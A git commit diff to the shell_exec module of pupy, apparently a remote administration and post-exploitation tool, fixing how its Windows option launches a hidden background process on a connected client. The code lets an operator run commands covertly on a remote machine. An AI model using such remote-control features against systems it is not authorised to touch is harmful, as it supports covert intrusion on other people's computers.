25aea8e4cd99695adb1e2d09977f5a798bda295b
Oleksii Shevchuk <alxchk@gmail.com>
2016-08-25 09:06:09 +0300

    Fix launching hidden process

--- pupy/modules/shell_exec.py
+++ pupy/modules/shell_exec.py
@@ -14,7 +14,7 @@ class ShellExec(PupyModule):
         self.arg_parser = PupyArgumentParser(prog='shell_exec', description=self.__doc__)
         self.arg_parser.add_argument('-s', '--shell', help="default to /bin/sh on linux or cmd.exe on windows")
         self.arg_parser.add_argument('argument', help='use unix like syntax and put simple quotes if there is multiple arguments')
-        self.arg_parser.add_argument('-H', '--hide', metavar='<exe_path>',help='launch process on background (only for windows)')
+        self.arg_parser.add_argument('-H', '--hide', action='store_true', help='launch process on background (only for windows)')
         self.arg_parser.add_argument('-log', help='Save log to file (when not background process)')
     def run(self, args):
         if not args.hide:
@@ -27,7 +27,7 @@ class ShellExec(PupyModule):
             try:
                 self.client.load_package("psutil")
                 self.client.load_package("pupwinutils.processes")
-                p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.hide)
+                p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.argument)
                 pid=p.pid
                 self.success("Process created with pid %s" % p.pid)
             except Exception, e:
